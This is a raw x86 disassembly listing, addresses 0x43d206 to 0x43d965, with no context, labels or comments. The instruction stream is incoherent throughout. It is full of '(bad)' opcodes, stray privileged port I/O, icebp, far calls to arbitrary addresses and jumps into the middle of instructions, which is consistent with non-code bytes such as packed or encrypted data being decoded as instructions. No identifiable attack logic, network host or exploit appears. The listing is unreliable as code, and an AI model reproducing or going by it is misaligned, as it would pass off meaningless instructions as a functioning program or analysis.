  43d206:	imul   edi,DWORD PTR [eax],0x81a959cf
  43d20c:	repz sub BYTE PTR [ecx],0xf1
  43d210:	mov    WORD PTR ds:0x475e5c94,cs
  43d216:	icebp  
  43d217:	int    0xec
  43d219:	inc    edi
  43d21a:	leave  
  43d21b:	loopne 0x43d23c
  43d21d:	popa   
  43d21e:	xor    DWORD PTR [edi],ebp
  43d220:	leave  
  43d221:	ror    DWORD PTR [edi],1
  43d223:	call   0x7e993cf8
  43d228:	ret    0x8fa4
  43d22b:	sbb    DWORD PTR [esi+0x5a],0x1fd899ac
  43d232:	xor    bl,BYTE PTR [edi+0x35]
  43d235:	pusha  
  43d236:	dec    edi
  43d237:	jl     0x43d209
  43d239:	jl     0x43d278
  43d23b:	div    DWORD PTR [edi]
  43d23d:	test   eax,0xfd5e143c
  43d242:	cli    
  43d243:	mov    dl,0xc7
  43d245:	xchg   edx,eax
  43d246:	ret    
  43d247:	jl     0x43d225
  43d249:	pusha  
  43d24a:	jno    0x43d23e
  43d24c:	test   DWORD PTR [edi],edi
  43d24e:	adc    DWORD PTR [esi-0x12],0x7e
  43d252:	and    DWORD PTR [esp+ecx*1+0x193ddae1],esp
  43d259:	lock iret 
  43d25b:	sub    ebp,DWORD PTR [edx+ebx*2]
  43d25e:	mov    dl,0x49
  43d260:	xor    BYTE PTR [ecx],bh
  43d262:	push   es
  43d263:	add    DWORD PTR [ebx],esi
  43d265:	test   DWORD PTR [ebp+0x58c15e16],0x4dfbe367
  43d26f:	rcl    edx,cl
  43d271:	push   0xacbabe9d
  43d276:	push   es
  43d277:	scas   eax,DWORD PTR es:[edi]
  43d278:	fs out dx,eax
  43d27a:	inc    ebp
  43d27b:	sar    ch,1
  43d27d:	inc    ecx
  43d27e:	jnp    0x43d272
  43d280:	out    dx,al
  43d281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d283:	cmp    al,0xfe
  43d285:	ja     0x43d2a2
  43d287:	(bad)  
  43d288:	pop    edi
  43d289:	imul   ebp,DWORD PTR [ebx-0x73904d4b],0x41
  43d290:	xor    DWORD PTR [edi+0x7a1da1ec],0x92da0a01
  43d29a:	mov    ch,0x6c
  43d29c:	and    esp,DWORD PTR [edi-0x58415401]
  43d2a2:	cs cdq 
  43d2a4:	adc    DWORD PTR [ecx],esp
  43d2a6:	fist   DWORD PTR [eax+ebp*8-0x7d7aa4b6]
  43d2ad:	pusha  
  43d2ae:	add    BYTE PTR [ebx],0xab
  43d2b1:	(bad)  
  43d2b2:	mov    ds:0x7ad25eac,eax
  43d2b7:	out    dx,al
  43d2b8:	bnd jnp 0x43d288
  43d2bb:	dec    edx
  43d2bc:	ret    
  43d2bd:	pusha  
  43d2be:	scas   eax,DWORD PTR es:[edi]
  43d2bf:	test   eax,0x608dfcf9
  43d2c4:	xchg   edi,eax
  43d2c5:	fldz   
  43d2c7:	jne    0x43d2f7
  43d2c9:	mov    ah,0x5c
  43d2cb:	jmp    0xa13d9e17
  43d2d0:	mov    DWORD PTR [ebp-0x393d7385],esp
  43d2d6:	jp     0x43d2ff
  43d2d8:	pop    ebp
  43d2d9:	push   0xd9e69993
  43d2de:	test   al,0x1f
  43d2e0:	xchg   esi,eax
  43d2e1:	in     eax,dx
  43d2e2:	scas   al,BYTE PTR es:[edi]
  43d2e3:	mov    al,ds:0x10517038
  43d2e8:	mov    al,ds:0x5e311a8c
  43d2ed:	cmp    dl,BYTE PTR [edx]
  43d2ef:	test   ax,0x8368
  43d2f3:	mov    esi,0xb34a66c6
  43d2f8:	pop    esi
  43d2f9:	dec    ecx
  43d2fa:	inc    edi
  43d2fb:	jnp    0x43d348
  43d2fd:	fisttp DWORD PTR [ecx-0xfcbbb6b]
  43d303:	gs pop esi
  43d305:	ja     0x43d383
  43d307:	fist   WORD PTR [edx-0x56]
  43d30a:	push   eax
  43d30b:	mov    al,ds:0xb0117566
  43d310:	sahf   
  43d311:	mov    esp,0x8099065e
  43d316:	out    dx,al
  43d317:	and    DWORD PTR [edi+0x23],ecx
  43d31a:	jg     0x43d307
  43d31c:	pop    ecx
  43d31d:	xor    esi,DWORD PTR [eax-0x60]
  43d320:	sbb    eax,0xbe038649
  43d325:	cwde   
  43d326:	test   BYTE PTR [ecx+edx*4+0x72aeee87],bl
  43d32d:	loopne 0x43d306
  43d32f:	sahf   
  43d330:	mov    esi,0x6ea0db8f
  43d335:	push   0xffffffe5
  43d337:	jbe    0x43d313
  43d339:	adc    cl,al
  43d33b:	mov    dl,0x88
  43d33d:	mov    edx,0xed0b3aee
  43d342:	mov    cl,0x1
  43d344:	retf   0xc30f
  43d347:	call   0xd0bc347b
  43d34c:	repz daa 
  43d34e:	loope  0x43d341
  43d350:	cmp    BYTE PTR [eax-0x35d83912],ch
  43d356:	pop    edx
  43d357:	stc    
  43d358:	sub    eax,0x479fe0f4
  43d35d:	mov    bl,0x6b
  43d35f:	fstp   QWORD PTR [esi-0x15]
  43d362:	and    edi,esi
  43d364:	xor    eax,0xddf3ee25
  43d369:	mov    WORD PTR [eax-0x67],?
  43d36c:	pop    ds
  43d36d:	push   esp
  43d36e:	xchg   BYTE PTR [ecx-0x4a1e279c],ah
  43d374:	mov    ds:0x5eac8a9f,eax
  43d379:	jo     0x43d3f5
  43d37b:	sub    BYTE PTR [edx-0x5c],ah
  43d37e:	(bad)  
  43d37f:	cli    
  43d380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d381:	pusha  
  43d382:	mov    eax,ds:0x5338b76b
  43d387:	pmaddwd mm5,mm0
  43d38a:	xchg   BYTE PTR [ebx],dl
  43d38c:	pop    ebp
  43d38d:	(bad)  
  43d38e:	pop    eax
  43d38f:	int    0xe1
  43d391:	scas   eax,DWORD PTR es:[edi]
  43d392:	sbb    ah,BYTE PTR [edx-0x5a]
  43d395:	mov    bh,0x0
  43d397:	mov    ds:0x70e1bd95,al
  43d39c:	repz test DWORD PTR [eax],0xeeccb901
  43d3a3:	mov    dh,0x91
  43d3a5:	scas   al,BYTE PTR es:[edi]
  43d3a6:	js     0x43d340
  43d3a8:	aas    
  43d3a9:	sub    bh,dl
  43d3ab:	mov    al,ds:0xd205b72
  43d3b0:	xor    BYTE PTR [ecx],0x6d
  43d3b3:	retf   
  43d3b4:	pop    esi
  43d3b5:	data16 jecxz 0x43d37c
  43d3b8:	mov    esp,0x5dbf3f28
  43d3bd:	pop    edx
  43d3be:	and    al,0xc1
  43d3c0:	xchg   esi,eax
  43d3c1:	in     al,0x12
  43d3c3:	pop    eax
  43d3c4:	push   edi
  43d3c5:	xchg   esi,eax
  43d3c6:	out    dx,al
  43d3c7:	or     BYTE PTR [edi],al
  43d3c9:	push   ebx
  43d3ca:	inc    ebx
  43d3cb:	rcr    DWORD PTR [esi+0x28],cl
  43d3ce:	retf   0xe4e8
  43d3d1:	jl     0x43d396
  43d3d3:	inc    edx
  43d3d4:	aad    0x63
  43d3d6:	jae    0x43d394
  43d3d8:	fisubr WORD PTR [ebp+0x63]
  43d3db:	push   ecx
  43d3dc:	adc    DWORD PTR [edx-0xd],edi
  43d3df:	add    ebx,DWORD PTR [esi-0x67]
  43d3e2:	cmp    eax,0x47247d3d
  43d3e7:	cmp    al,0xef
  43d3e9:	pop    esi
  43d3ea:	inc    esp
  43d3eb:	sub    ecx,DWORD PTR [ebx+0x1ee10562]
  43d3f1:	ins    BYTE PTR es:[edi],dx
  43d3f2:	(bad)  
  43d3f3:	mov    bl,0xf0
  43d3f5:	push   ecx
  43d3f6:	out    dx,al
  43d3f7:	jbe    0x43d3b7
  43d3f9:	jecxz  0x43d3fb
  43d3fb:	mov    ch,0xde
  43d3fd:	push   cs
  43d3fe:	or     BYTE PTR [ecx+0x5fd23],ah
  43d404:	cmc    
  43d405:	mov    edx,0x685f3d8d
  43d40a:	aad    0x6a
  43d40c:	mov    ebx,0x15213a0b
  43d411:	ror    ebp,1
  43d413:	mov    al,ds:0x658fa047
  43d418:	jne    0x43d438
  43d41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d41b:	xor    al,0x5e
  43d41d:	pop    edx
  43d41e:	pushf  
  43d41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d420:	mov    al,ah
  43d422:	arpl   WORD PTR [edi+0x6d],bp
  43d425:	pop    edi
  43d426:	xchg   esp,eax
  43d427:	jp     0x43d477
  43d429:	(bad)  
  43d42a:	lock mov bl,al
  43d42d:	mov    eax,ds:0x9cbc012f
  43d432:	test   DWORD PTR [ebp+0x5d],eax
  43d435:	jno    0x43d498
  43d437:	popa   
  43d438:	stc    
  43d439:	jmp    0x43d43d
  43d43b:	imul   ebp,esi,0x31a0cdc9
  43d441:	fsub   QWORD PTR [esi]
  43d443:	lods   al,BYTE PTR ds:[esi]
  43d444:	cmp    ebx,esi
  43d446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d447:	mov    edi,0x5e60b659
  43d44c:	test   al,0x2c
  43d44e:	cs cwde 
  43d450:	or     ebp,eax
  43d452:	mov    edx,0xcad56a0
  43d457:	fcos   
  43d459:	sbb    al,0x46
  43d45b:	fbld   TBYTE PTR [esi]
  43d45d:	imul   ebp,DWORD PTR [eax+ebp*4],0x61
  43d461:	push   0x5b
  43d463:	lock mov al,0x4f
  43d466:	and    eax,0x1bdb71e1
  43d46b:	mov    eax,ds:0x31c51be9
  43d470:	gs iret 
  43d472:	(bad)  
  43d474:	pop    esi
  43d475:	daa    
  43d476:	sub    ecx,ebx
  43d478:	mov    esp,0x9e049b8f
  43d47d:	pusha  
  43d47e:	mov    dl,0x6d
  43d480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d481:	sti    
  43d482:	cmp    al,0x6d
  43d484:	or     al,0x4b
  43d486:	and    edi,DWORD PTR [esi]
  43d488:	(bad)  
  43d48a:	test   al,0xf
  43d48c:	cwde   
  43d48d:	mov    es:0xac607e0b,eax
  43d493:	add    BYTE PTR ss:[edx-0x196e7da5],bh
  43d49a:	out    dx,al
  43d49b:	xor    eax,0xeb69da67
  43d4a0:	test   DWORD PTR [edx-0x2f],0xc20e56a0
  43d4a7:	retf   
  43d4a8:	fdiv   QWORD PTR [ecx+0x7a]
  43d4ab:	or     edi,DWORD PTR [edx]
  43d4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d4ae:	aad    0x4c
  43d4b0:	pop    esi
  43d4b1:	push   ebx
  43d4b2:	adc    BYTE PTR [ebx-0x57c7085f],cl
  43d4b8:	add    DWORD PTR [edx+ecx*8-0x29],eax
  43d4bc:	xor    eax,0x66b08e00
  43d4c1:	xchg   BYTE PTR [esi+0x30],bh
  43d4c4:	push   edi
  43d4c5:	add    al,0x16
  43d4c7:	or     eax,0x3ceef86f
  43d4cc:	dec    ebp
  43d4cd:	shl    BYTE PTR [ebp-0xa38320b],0xa1
  43d4d4:	test   BYTE PTR [edi+0x5ba9412d],0xe5
  43d4db:	jl     0x43d47b
  43d4dd:	mov    ah,0xee
  43d4df:	fwait
  43d4e0:	mov    ebp,0xd04e27fd
  43d4e5:	pop    ss
  43d4e6:	dec    edx
  43d4e7:	mov    eax,ds:0x7e53768d
  43d4ec:	sub    al,0xd5
  43d4ee:	pop    esp
  43d4ef:	push   bx
  43d4f1:	cdq    
  43d4f2:	sub    al,0xd8
  43d4f4:	pop    esi
  43d4f5:	mov    ds:0xbf159a0b,al
  43d4fa:	dec    ebx
  43d4fb:	mov    eax,ds:0x9163228b
  43d500:	jecxz  0x43d50d
  43d502:	inc    esp
  43d503:	dec    edi
  43d504:	dec    edi
  43d505:	dec    edx
  43d506:	(bad)  
  43d507:	cmp    ebx,DWORD PTR [esi-0x58]
  43d50a:	ds mov dl,0xcc
  43d50d:	dec    esp
  43d50e:	in     eax,0x8
  43d510:	mov    esi,0xaca11c27
  43d515:	or     bl,BYTE PTR [eax+edi*2+0x4027c373]
  43d51c:	pusha  
  43d51d:	push   ss
  43d51e:	sbb    bl,dl
  43d520:	sub    BYTE PTR [ebx-0x8],0xe0
  43d524:	jecxz  0x43d4b5
  43d526:	jno    0x43d4c7
  43d528:	cmp    eax,0xd3d5766e
  43d52d:	fisttp WORD PTR [ecx]
  43d52f:	test   al,al
  43d531:	ja     0x43d561
  43d533:	jns    0x43d53b
  43d535:	cld    
  43d536:	out    dx,al
  43d537:	sar    BYTE PTR [ebp+0x89ff221],1
  43d53d:	push   0xffffffd8
  43d53f:	mov    al,ds:0x7eb8fe02
  43d544:	xor    BYTE PTR [edi],cl
  43d546:	push   ebp
  43d547:	push   edi
  43d548:	pop    esi
  43d549:	mov    bh,0x65
  43d54b:	or     edx,DWORD PTR [ecx+0x61fdf916]
  43d551:	inc    edx
  43d552:	ins    DWORD PTR es:[edi],dx
  43d553:	jb     0x43d4e2
  43d555:	loopne 0x43d4f5
  43d557:	and    al,0xef
  43d559:	jecxz  0x43d50d
  43d55b:	jmp    0x43d5bc
  43d55d:	push   esi
  43d55e:	push   ebx
  43d55f:	test   DWORD PTR [esi],esp
  43d561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d562:	or     al,0x6d
  43d564:	fiadd  WORD PTR ds:0x613c067c
  43d56a:	sub    eax,0x5b0aa21b
  43d56f:	push   ds
  43d570:	shr    DWORD PTR [ecx],0xee
  43d573:	fdivr  QWORD PTR [edx]
  43d575:	dec    esp
  43d576:	pop    esp
  43d577:	xor    DWORD PTR fs:[esi-0x31be5e69],esp
  43d57e:	outs   dx,DWORD PTR ds:[esi]
  43d57f:	stos   DWORD PTR es:[edi],eax
  43d580:	lock mov al,0x14
  43d583:	xor    DWORD PTR [esi-0x67],ebx
  43d586:	cmp    al,0x37
  43d588:	pop    es
  43d589:	cmp    al,0x8c
  43d58b:	add    DWORD PTR [edx+edx*2+0x77],ebp
  43d58f:	in     eax,dx
  43d590:	xchg   edi,eax
  43d591:	daa    
  43d592:	push   cs
  43d593:	pusha  
  43d594:	mov    bl,BYTE PTR [edx+0xd5ec20f]
  43d59a:	add    ah,cl
  43d59c:	repz xor DWORD PTR [edx-0x1bade769],ebp
  43d5a3:	dec    eax
  43d5a4:	call   0x8de1:0x8c2b4eea
  43d5ab:	aas    
  43d5ac:	push   edx
  43d5ad:	add    eax,DWORD PTR [edx+0x52]
  43d5b0:	pop    ecx
  43d5b1:	clc    
  43d5b2:	adc    BYTE PTR [esi-0x62],dl
  43d5b5:	push   0x612d339e
  43d5ba:	xor    BYTE PTR [eax-0x6b3ae5e3],cl
  43d5c0:	jb     0x43d63c
  43d5c2:	in     al,dx
  43d5c3:	fst    QWORD PTR [ebp+0x11]
  43d5c6:	xchg   BYTE PTR [eax+0x3ae0411e],al
  43d5cc:	xchg   BYTE PTR [ebp-0x73],bl
  43d5cf:	push   ecx
  43d5d0:	xlat   BYTE PTR ds:[ebx]
  43d5d1:	fadd   DWORD PTR [esi]
  43d5d3:	mov    esp,0xaa76fb6f
  43d5d8:	pop    ecx
  43d5d9:	cdq    
  43d5da:	lock aas 
  43d5dc:	ins    BYTE PTR es:[edi],dx
  43d5dd:	test   DWORD PTR ds:[edx-0x7e22c9e0],esp
  43d5e4:	jg     0x43d5c6
  43d5e6:	jb     0x43d617
  43d5e8:	mov    fs,WORD PTR [eax+0x2]
  43d5eb:	push   cs
  43d5ec:	adc    al,0x5e
  43d5ee:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  43d5f0:	or     eax,0x6901ee3c
  43d5f5:	mov    dh,0xe0
  43d5f7:	jo     0x43d5bc
  43d5f9:	mov    edx,0xea7da420
  43d5fe:	imul   edx,DWORD PTR gs:[ecx-0x138ed0d9],0xfffffff3
  43d606:	mov    WORD PTR [esi+ebx*2-0x4d],gs
  43d60a:	loop   0x43d5dc
  43d60c:	xor    eax,0x9a0d5eda
  43d611:	pusha  
  43d612:	cmp    al,0x60
  43d614:	mov    eax,0x7bfed812
  43d619:	(bad)  
  43d61a:	out    dx,al
  43d61b:	cmp    ebx,DWORD PTR [ecx]
  43d61d:	add    DWORD PTR [esi],0x6189ed1d
  43d623:	mov    eax,ds:0xa87a92fc
  43d628:	fsub   st,st(2)
  43d62a:	lds    esp,FWORD PTR [ecx-0x5fee41a2]
  43d630:	dec    esp
  43d631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d632:	(bad)  
  43d633:	xlat   BYTE PTR ds:[ebx]
  43d634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d635:	jb     0x43d655
  43d637:	pop    esp
  43d638:	stc    
  43d639:	pusha  
  43d63a:	or     DWORD PTR [ebp-0x78],edx
  43d63d:	jmp    0x6971:0x3f5e400c
  43d644:	pop    edx
  43d645:	rcr    DWORD PTR [ebx+0x67],cl
  43d648:	add    DWORD PTR [ecx-0x66],esp
  43d64b:	out    0xc9,eax
  43d64d:	jmp    0xbbdce425
  43d652:	add    edx,edx
  43d654:	shl    DWORD PTR [esi],0x75
  43d657:	imul   eax,edx,0x5d
  43d65a:	mov    DWORD PTR [ebp-0x5d],esp
  43d65d:	loopne 0x43d660
  43d65f:	adc    ah,BYTE PTR [ecx+0x1702bf59]
  43d665:	leave  
  43d666:	add    WORD PTR [ebx+0xa],0xeb9c
  43d66c:	pop    edi
  43d66d:	pop    ebx
  43d66e:	jp     0x43d65c
  43d670:	jl     0x43d5fa
  43d672:	sub    BYTE PTR [eax],bl
  43d674:	out    dx,al
  43d675:	xor    eax,0x60d86b0b
  43d67a:	shr    DWORD PTR [eax-0x45],0x33
  43d67e:	and    eax,0xeec40e7d
  43d683:	and    dh,BYTE PTR [edi]
  43d685:	std    
  43d686:	xchg   ebp,eax
  43d687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d688:	cld    
  43d689:	inc    ecx
  43d68a:	aad    0xa0
  43d68c:	sub    cl,cl
  43d68e:	in     al,dx
  43d68f:	sti    
  43d690:	inc    edx
  43d691:	inc    ebx
  43d692:	mov    ah,0x7e
  43d694:	pop    esi
  43d695:	mov    BYTE PTR [ecx],bh
  43d697:	cs and eax,0x5fc8bd2f
  43d69d:	bound  ecx,QWORD PTR [ebp-0x5d88a101]
  43d6a3:	pop    edi
  43d6a4:	das    
  43d6a5:	push   esi
  43d6a6:	call   0x3765:0xeecff648
  43d6ad:	dec    edi
  43d6ae:	cmp    edx,ebp
  43d6b0:	aad    0x26
  43d6b2:	dec    ebx
  43d6b3:	mov    eax,ds:0xa29cab60
  43d6b8:	rcr    BYTE PTR es:[esi],cl
  43d6bb:	mov    ebp,0x124f8953
  43d6c0:	pop    esi
  43d6c1:	in     al,0x8
  43d6c3:	cli    
  43d6c4:	fs pop ds
  43d6c6:	pop    ebp
  43d6c7:	mov    eax,ds:0x27cffeb0
  43d6cc:	or     DWORD PTR [eax+ebp*1],esp
  43d6cf:	neg    DWORD PTR [esi+0x5]
  43d6d2:	inc    ebx
  43d6d3:	push   edx
  43d6d4:	mov    ebx,0xa0f578f6
  43d6d9:	pusha  
  43d6da:	mov    cl,dl
  43d6dc:	cmp    esp,esp
  43d6de:	jp     0x43d744
  43d6e0:	nop
  43d6e1:	inc    DWORD PTR [eax]
  43d6e3:	bound  ecx,QWORD PTR [edi+0xe]
  43d6e6:	out    dx,eax
  43d6e7:	(bad)
  43d6eb:	js     0x43d67b
  43d6ed:	test   DWORD PTR [edi-0x5f],esi
  43d6f0:	jmp    0x43d71a
  43d6f2:	push   esp
  43d6f3:	lods   al,BYTE PTR ds:[esi]
  43d6f4:	dec    esi
  43d6f5:	mov    dh,0xf2
  43d6f7:	jge    0x43d721
  43d6f9:	into   
  43d6fa:	out    dx,al
  43d6fb:	add    eax,0x4f26cf64
  43d700:	pop    edi
  43d701:	pop    edi
  43d702:	rcr    ecx,0xe6
  43d705:	call   0xb8e4:0xb7eaa80
  43d70c:	pop    esi
  43d70d:	gs jge 0x43d73f
  43d710:	jg     0x43d75a
  43d712:	sub    BYTE PTR [ecx],0xf3
  43d715:	pusha  
  43d716:	xchg   ebx,eax
  43d717:	(bad)  
  43d719:	std    
  43d71a:	ins    DWORD PTR es:[edi],dx
  43d71b:	xchg   esi,eax
  43d71c:	push   esp
  43d71d:	jp     0x43d70e
  43d71f:	pop    edx
  43d720:	retf   0xcca5
  43d723:	cmp    BYTE PTR [edx],0xb5
  43d726:	into   
  43d727:	rcl    BYTE PTR [edx],0xb3
  43d72a:	jge    0x43d6cd
  43d72c:	sbb    eax,0x79727488
  43d731:	aad    0x81
  43d733:	neg    BYTE PTR [esi-0x2c]
  43d736:	pop    esi
  43d737:	xor    al,0xc7
  43d739:	dec    ebx
  43d73a:	mov    edi,0xaf657d96
  43d73f:	inc    edi
  43d740:	pop    ecx
  43d741:	mov    ds:0x99a1b548,eax
  43d746:	lahf   
  43d747:	loope  0x43d75e
  43d749:	test   DWORD PTR [edx],edx
  43d74b:	or     al,0x63
  43d74d:	mov    bh,0x38
  43d74f:	and    bl,BYTE PTR [ecx+0x1aa0ab31]
  43d755:	je     0x43d76e
  43d757:	sti    
  43d758:	inc    eax
  43d759:	pop    esi
  43d75a:	cmc    
  43d75b:	mov    bl,0x0
  43d75d:	ja     0x43d768
  43d75f:	fild   QWORD PTR [ebx-0x2f4b1109]
  43d765:	jmp    0x197a1065
  43d76a:	jp     0x43d795
  43d76c:	jnp    0x43d74e
  43d76e:	retf   0x99ac
  43d771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d772:	into   
  43d773:	sbb    edx,DWORD PTR [esi]
  43d775:	popa   
  43d776:	(bad)  
  43d777:	leave  
  43d778:	xor    DWORD PTR [esi],esp
  43d77a:	pop    ecx
  43d77b:	out    dx,eax
  43d77c:	dec    esp
  43d77d:	jg     0x43d76d
  43d77f:	(bad)  
  43d780:	(bad)  
  43d781:	mov    esp,0x784b5bae
  43d786:	adc    DWORD PTR [ebp+0x73],ebp
  43d789:	pusha  
  43d78a:	sbb    edx,DWORD PTR [eax-0x43]
  43d78d:	rcr    DWORD PTR [eax-0x60c00730],1
  43d793:	mov    eax,ds:0xac9c5d98
  43d798:	shl    DWORD PTR [eax-0x2f],1
  43d79b:	and    al,0xae
  43d79d:	sti    
  43d79e:	adc    BYTE PTR [ecx-0x4cdbba36],cl
  43d7a4:	ss loope 0x43d753
  43d7a7:	ds cdq 
  43d7a9:	mov    eax,DWORD PTR [ebp+0x1941b088]
  43d7af:	inc    ebx
  43d7b0:	mov    dh,0xc3
  43d7b2:	mov    cl,0xe0
  43d7b4:	dec    esi
  43d7b5:	in     al,dx
  43d7b6:	sbb    bh,BYTE PTR [ebp+0x36]
  43d7b9:	ss adc bh,BYTE PTR fs:[eax-0x5a]
  43d7be:	pop    esi
  43d7bf:	sti    
  43d7c0:	pop    esi
  43d7c1:	mov    ds:0xd3c8451c,al
  43d7c6:	xchg   esi,eax
  43d7c7:	cdq    
  43d7c8:	mov    edi,0x16e8c830
  43d7cd:	popa   
  43d7ce:	cmp    eax,0x1e22995
  43d7d3:	rol    esp,cl
  43d7d5:	imul   esi
  43d7d7:	out    0xa1,eax
  43d7d9:	push   ds
  43d7da:	xor    eax,0x244308cf
  43d7df:	mov    eax,ds:0x565453a9
  43d7e4:	pop    ebp
  43d7e5:	mov    dh,0xf7
  43d7e7:	push   esp
  43d7e8:	xor    al,0xa1
  43d7ea:	cli    
  43d7eb:	mov    al,ds:0x5ed4f179
  43d7f0:	test   DWORD PTR [esi+0x60e46acd],0x6b91e8f2
  43d7fa:	cdq    
  43d7fb:	add    eax,0x59eec80e
  43d800:	jge    0x43d816
  43d802:	stc    
  43d803:	out    dx,al
  43d804:	stos   DWORD PTR es:[edi],eax
  43d805:	sbb    ah,BYTE PTR [ebx]
  43d807:	mov    eax,ds:0x94834311
  43d80c:	rol    edx,0xdc
  43d80f:	neg    DWORD PTR [esi+0x1d]
  43d812:	inc    eax
  43d813:	sbb    ecx,DWORD PTR [edi+ebx*4-0x6]
  43d817:	add    ebx,DWORD PTR [edx+edx*2-0xa]
  43d81b:	pop    edx
  43d81c:	add    BYTE PTR [esi-0x35],bh
  43d81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d820:	std    
  43d821:	sub    esi,DWORD PTR [esi-0x40]
  43d824:	adc    al,0x28
  43d826:	in     eax,dx
  43d827:	jl     0x43d815
  43d829:	nop
  43d82a:	jnp    0x43d803
  43d82c:	addr16 cdq 
  43d82e:	dec    esi
  43d82f:	ss inc ecx
  43d831:	popa   
  43d832:	icebp  
  43d833:	xchg   ecx,eax
  43d834:	into   
  43d835:	sbb    dh,dl
  43d837:	imul   ebp,DWORD PTR [esi],0x57
  43d83a:	out    dx,al
  43d83b:	int3   
  43d83c:	or     edi,ebp
  43d83e:	adc    edx,edi
  43d840:	lea    ebp,[esi+0x3b]
  43d843:	inc    ecx
  43d844:	ret    
  43d845:	and    edi,DWORD PTR [ecx+eiz*4]
  43d848:	sub    al,0x47
  43d84a:	por    mm2,QWORD PTR [eax+0x34]
  43d84e:	(bad)  
  43d84f:	lock pop esi
  43d851:	or     ebp,DWORD PTR [edx-0x3a]
  43d854:	lods   eax,DWORD PTR ds:[esi]
  43d855:	lea    ecx,[edx+0x44]
  43d858:	xor    DWORD PTR [ebp+0x52cc9ef3],esi
  43d85e:	inc    ebp
  43d85f:	pop    eax
  43d860:	sbb    eax,0x9b9e4ffb
  43d865:	xchg   esp,eax
  43d866:	cmp    ebx,DWORD PTR [edi]
  43d868:	pop    esi
  43d869:	lahf   
  43d86a:	inc    edi
  43d86b:	imul   ebx,DWORD PTR [esi-0x16b3640c],0x13bff960
  43d875:	outs   dx,BYTE PTR ds:[esi]
  43d876:	mov    ah,bh
  43d878:	iret   
  43d879:	retf   0x15ee
  43d87c:	je     0x43d844
  43d87e:	leave  
  43d87f:	out    dx,eax
  43d880:	cmp    ebx,DWORD PTR [esi+0x72]
  43d883:	mov    eax,ds:0x4e3684bf
  43d888:	push   es
  43d889:	fimul  DWORD PTR [edx+0x56]
  43d88c:	pop    esi
  43d88d:	inc    esi
  43d88e:	inc    esi
  43d88f:	icebp  
  43d890:	imul   ebx,DWORD PTR [esi+0x662fc2cf],0xffffffe2
  43d897:	imul   ebx,esi,0x11b31d5
  43d89d:	stc    
  43d89e:	cmc    
  43d89f:	not    DWORD PTR [ecx-0x65]
  43d8a2:	mov    bl,ch
  43d8a4:	aaa    
  43d8a5:	popa   
  43d8a6:	out    0xd5,eax
  43d8a8:	xor    ebx,DWORD PTR [esi]
  43d8aa:	pop    esi
  43d8ab:	or     DWORD PTR [eax],esi
  43d8ad:	das    
  43d8ae:	jmp    0x43d855
  43d8b0:	in     eax,0xd4
  43d8b2:	sbb    BYTE PTR [ebx],dl
  43d8b4:	jne    0x43d856
  43d8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d8b7:	dec    edx
  43d8b8:	add    dl,BYTE PTR [esi-0x12]
  43d8bb:	out    dx,eax
  43d8bc:	inc    ebx
  43d8bd:	sbb    eax,0x2560a98e
  43d8c2:	loopne 0x43d871
  43d8c4:	sahf   
  43d8c5:	mov    ch,0x6e
  43d8c7:	rcr    DWORD PTR [esi+ecx*2-0xb79d746],0xee
  43d8cf:	(bad)  
  43d8d0:	fsub   QWORD PTR [edi-0x2ed26ab5]
  43d8d6:	ins    BYTE PTR es:[edi],dx
  43d8d7:	mov    ds:0x3995eee9,al
  43d8dc:	mov    esi,0x8c017163
  43d8e1:	adc    al,0xd9
  43d8e3:	push   esi
  43d8e4:	gs inc esi
  43d8e6:	mov    ecx,0x30611418
  43d8eb:	ucomiss xmm5,DWORD PTR [ebx]
  43d8ee:	in     eax,dx
  43d8ef:	pop    DWORD PTR [edx]
  43d8f1:	nop
  43d8f2:	nop
  43d8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d8f4:	repz popf 
  43d8f6:	cmc    
  43d8f7:	push   es
  43d8f8:	(bad)  
  43d8f9:	aam    0x58
  43d8fb:	add    BYTE PTR [esi+0x7c],bl
  43d8fe:	xchg   esi,eax
  43d8ff:	mov    bl,0xc3
  43d901:	dec    eax
  43d902:	adc    al,0x61
  43d904:	pusha  
  43d905:	pop    edx
  43d906:	or     BYTE PTR [ebp-0x4d],ah
  43d909:	mov    ebp,0xe78cd3fd
  43d90e:	cs mov ah,0x35
  43d911:	sbb    eax,0x799823f0
  43d916:	jne    0x43d8b9
  43d918:	scas   eax,DWORD PTR es:[edi]
  43d919:	sub    al,0x31
  43d91b:	aam    0x7e
  43d91d:	push   edi
  43d91e:	mov    DWORD PTR [edi],edx
  43d920:	inc    edi
  43d921:	and    DWORD PTR [edi+0x3a],0xffffffa4
  43d925:	lock or DWORD PTR [eax],esp
  43d928:	out    0x94,eax
  43d92a:	ret    0x78d9
  43d92d:	pusha  
  43d92e:	daa    
  43d92f:	inc    edx
  43d930:	out    dx,eax
  43d931:	lods   eax,DWORD PTR ds:[esi]
  43d932:	jns    0x43d9a0
  43d934:	and    BYTE PTR [ecx-0x3],ah
  43d937:	ss jbe 0x43d91d
  43d93a:	mov    DWORD PTR [eax+0x1aeed2c6],0x3ff61bcc
  43d944:	and    al,0x37
  43d946:	inc    edi
  43d947:	mov    cs,WORD PTR [ebx]
  43d949:	mov    ecx,0x4ba22199
  43d94e:	jl     0x43d91d
  43d950:	inc    ebx
  43d951:	mov    eax,ds:0x25d2d520
  43d956:	out    dx,al
  43d957:	(bad)  
  43d959:	rol    DWORD PTR [edi+0x58b5a13a],0xa1
  43d960:	(bad)  
  43d961:	iret   
  43d962:	jnp    0x43d9b3
  43d964:	inc    eax
  43d965:	xchg   BYTE PTR [eax+ebp*8+0x5e],dh
